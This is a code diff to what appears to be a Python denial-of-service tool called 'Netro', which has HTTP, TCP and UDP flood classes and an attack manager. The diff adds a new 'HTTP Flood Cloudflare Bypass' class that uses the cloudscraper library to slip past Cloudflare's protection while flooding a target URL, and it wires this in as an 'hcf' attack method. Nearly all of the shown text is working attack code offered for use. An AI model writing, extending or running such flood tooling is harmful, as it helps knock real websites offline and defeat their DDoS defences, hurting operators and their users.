@@ -1,4 +1,5 @@
 from urllib.parse import urlparse
+import cloudscraper
 import threading
 import random
 import socket
@@ -12,7 +13,7 @@ class NetroHTTP(object):
     kill = False
     active_threads = 0
 
-    def __init__(self, url: str, timeout: int):
+    def __init__(self, url: str, timeout: float):
         self.url = url
         parsed_url = urlparse(url)
 
@@ -81,8 +82,26 @@ class NetroHTTP(object):
                     request_data += f"{header_name}: {header_value}\r\n"
                 
                 request_data += "\r\n"
+
                 sock.send(request_data.encode())
                 time.sleep(1)
+        except Exception:
+            return
+        finally:
+            self.active_threads -= 1
+
+# HTTP Flood Cloudflare Bypass
+class NetroHCF(object):
+    kill = False
+    active_threads = 0
+
+    def __init__(self, target: str):
+        self.target = target
+        self.scraper = cloudscraper.create_scraper()
+    
+    def create_attack_instance(self):
+        try:
+            self.scraper.get(self.target)
         except Exception:
             return
         finally:
@@ -92,7 +111,7 @@ class NetroTCP(object):
     kill = False
     active_threads = 0
 
-    def __init__(self, target: str, timeout: int):
+    def __init__(self, target: str, timeout: float):
         host, port = target.split(":", 1)
         port = int(port)
 
@@ -125,7 +144,7 @@ class NetroUDP(object):
     kill = False
     active_threads = 0
 
-    def __init__(self, target: str, timeout: int):
+    def __init__(self, target: str, timeout: float):
         host, port = target.split(":", 1)
         port = int(port)
 
@@ -167,6 +186,8 @@ class NetroAttackManager(object):
         match method:
             case "http":
                 netro_attack = NetroHTTP(url=target, timeout=timeout)
+            case "hcf":
+                netro_attack = NetroHCF(target=target)
             case "tcp":
                 netro_attack = NetroTCP(target=target, timeout=timeout)
             case "udp":
